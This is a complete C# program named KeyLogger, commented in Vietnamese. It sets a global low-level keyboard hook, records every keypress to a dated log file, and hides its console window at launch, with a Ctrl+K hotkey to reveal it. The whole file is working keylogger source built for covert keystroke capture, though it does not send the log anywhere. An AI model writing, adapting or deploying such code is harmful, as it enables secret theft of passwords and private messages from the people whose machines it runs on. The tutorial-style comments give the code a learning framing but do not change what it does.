//Khai báo các thư viện có sẵn .NET framework
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace KeyLogger
{
    class Program
    {
        #region hook key board
        //2 mã mặc định của windows
        //WH_KEYBOARD_LL = 13 lấy những phím vừa nhả ra
        //WM_KEYDOWN = 0x0100 lấy những phím vừa nhấn xuống
        //thư viện có sẵn tự trả cho bạn
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;

        //chưa hiểu (=.=')
        private static LowLevelKeyboardProc _proc = HookCallback;
        //handle lấy ID
        private static IntPtr _hookID = IntPtr.Zero;

        //Tạo file log các key đã bấm
        private static string logName = "Log_";
        private static string logExtendtion = ".txt";

        //thả hook
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        //bỏ hook ra
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        //thả hook tiếp theo
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        //lấy module handle kiểu IntPtr
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        // Delegate (ủy quyền) a LowLevelKeyboardProc to use user32.dll
        private delegate IntPtr LowLevelKeyboardProc(
        int nCode, IntPtr wParam, IntPtr lParam);

        // thả hook xuống tất cả các process
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            //lấy ra tất cả các process đang chạy
            using (Process curProcess = Process.GetCurrentProcess())
            {
                //lấy ra process đang hoạt động nhờ handle
                using (ProcessModule curModule = curProcess.MainModule)
                {
                    //thả hook xuống để lấy phím đã nhấn trong process đang hoạt động
                    return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
                }
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            //nCode >= 0: có gì đó trả về và kiểm tra parameter trả về có phải keydown hay không
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                //Marshal: lấy dữ liệu ra mà không nuốt luôn
                int vkCode = Marshal.ReadInt32(lParam);

                //xem các phím bấm xuống có phải hotkey đã set không
                CheckHotKey(vkCode);
                //Viết vào file log
                WriteLog(vkCode);
            }
            //thả hook lại để lấy key tiếp theo
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        static void WriteLog(int vkCode)
        {
            //Viết ra key mình nhập vào
            Console.WriteLine((Keys)vkCode);
            //Tạo file log dựa trên ngày hiện tại
            string logNameToWrite = logName + DateTime.Now.ToLongDateString() + logExtendtion;
            //Ghi dữ liệu vào file log
            StreamWriter sw = new StreamWriter(logNameToWrite, true);
            sw.Write((Keys)vkCode);
            sw.Close();
        }


        // chạy chương trình đã được ẩn đi
        // hiện lại chương trình nếu bấm tổ hợp hotkey
        static void HookKeyboard()
        {
            _hookID = SetHook(_proc);
            //chạy chương trình
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }

        //biến kiểm tra 
        static bool isHotKey = false;
        static bool isShowing = false;
        //xác định phím bấm trước đó 
        static Keys previoursKey = Keys.Separator;

        //hàm tạo phím tắt để có thể ẩn hoặc hiện cửa sổ console tham số đưa vào là vkCode 
        static void CheckHotKey(int vkCode)
        {
            //kiểm tra ấn tổ hợp phím tắt Ctrl trái và phím K đúng ko nếu đúng set giá trị isHotKey = true nghĩa //là ấn tổ hợp đúng 
            if (previoursKey == Keys.LControlKey  && (Keys)(vkCode) == Keys.K)
                isHotKey = true;

            // Nếu cửa sổ console đang không được bật thì ấn tổ hợp phím để hiển thị
            if (isHotKey)
            {
                //Nếu cửa sổ console không được hiển thị thì hiển thị 
                //Còn nếu đang hiển thị thì ẩn đi
                if (!isShowing)
                {
                    DisplayWindow();
                }
                else
                    HideWindow();

                //đặt lại trạng thái 
                isShowing = !isShowing;
            }

            //Set giá trị phím bấm trước 
            previoursKey = (Keys)vkCode;
            isHotKey = false;
        }
        #endregion      

        #region Windows
        [DllImport("kernel32.dll")]
        //Lấy màn hình console hiện tại của chúng ta 
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        //Hàm kiểm tra để ẩn hoặc bật cửa sổ ẩn hay hiện phụ thuộc vào tham số nCmdShow đưa vào 
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        // hide window code
        const int SW_HIDE = 0;

        // show window code
        const int SW_SHOW = 5;

        //Hàm ẩn cửa sổ console
        static void HideWindow()
        {
            IntPtr console = GetConsoleWindow();
            ShowWindow(console, SW_HIDE);
        }

        //Hàm hiển cửa sổ console
        static void DisplayWindow()
        {
            //Lấy handle của cửa số hiện tại
            IntPtr console = GetConsoleWindow();
            //Ẩn cửa sổ console đi nhờ tham số SW_SHOW
            ShowWindow(console, SW_SHOW);
        }
        #endregion
        static void Main(string[] args)
        {
            HideWindow();
            HookKeyboard();
        }
    }
}
